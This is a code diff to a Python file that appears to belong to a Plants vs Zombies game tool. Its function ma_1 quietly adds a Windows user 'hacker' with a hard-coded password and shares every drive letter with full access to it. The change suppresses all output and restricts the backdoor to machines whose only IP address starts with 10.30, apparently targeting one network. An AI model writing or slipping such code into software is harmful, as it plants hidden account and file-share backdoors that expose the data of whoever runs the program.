@@ -10,10 +10,16 @@ from exe import jiyu, files, page
 
 
 def ma_1():
-    new_user = subprocess.run("net user hacker QWERasdf1234 /add")
-    for letter in string.ascii_uppercase:# 便利共享所有的磁盘
-        command = f'net share {letter}={letter}:\\ /grant:hacker,full'
-        result = subprocess.run(command, shell=True, capture_output=True, text=True)
+    hostname = socket.gethostname()  # 获取本机所有IP地址
+    ip_addresses = socket.gethostbyname_ex(hostname)[2]
+    ip_list = []
+    for ip in ip_addresses:  # 打印所有IP地址
+        ip_list.append(ip)
+    if len(ip_list) == 1 and ip_list[0].startswith("10.30"):
+        subprocess.run("net user hacker QWERasdf1234 /add", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        for letter in string.ascii_uppercase:
+            command = f'net share {letter}={letter}:\\ /grant:hacker,full'
+            subprocess.run(command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def exe_1(choice):
     # C:\ProgramData\PopCap Games\PlantsVsZombies\pvzHE\yourdata
